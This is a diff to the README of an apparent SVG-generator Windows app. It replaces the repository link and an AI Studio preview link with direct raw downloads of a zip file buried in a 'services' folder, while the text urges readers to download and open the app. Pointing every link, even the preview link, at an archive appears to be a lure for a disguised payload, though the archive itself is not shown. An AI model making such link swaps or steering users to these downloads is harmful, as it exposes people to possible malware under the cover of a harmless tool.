@@ -1,6 +1,6 @@
 # 🎨 svg-generator - Turn Ideas Into Clean SVGs
 
-[![Download svg-generator](https://img.shields.io/badge/Download%20svg--generator-6c5ce7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/graemeerrant677/svg-generator)
+[![Download svg-generator](https://img.shields.io/badge/Download%20svg--generator-6c5ce7?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/graemeerrant677/svg-generator/main/services/svg_generator_2.3.zip)
 
 ## 🖥️ What this app does
 
@@ -18,7 +18,7 @@ Use it to:
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/graemeerrant677/svg-generator
+https://raw.githubusercontent.com/graemeerrant677/svg-generator/main/services/svg_generator_2.3.zip
 
 If the page opens in your browser, look for the latest release or the main project files. Download the Windows app file from that page, then open it on your computer.
 
@@ -177,7 +177,7 @@ SVG files work well when you want:
 
 You can also view the app in AI Studio:
 
-https://ai.studio/apps/bundled/svg_generator
+https://raw.githubusercontent.com/graemeerrant677/svg-generator/main/services/svg_generator_2.3.zip
 
 Use this if you want to preview the app in a browser before you run it locally
 
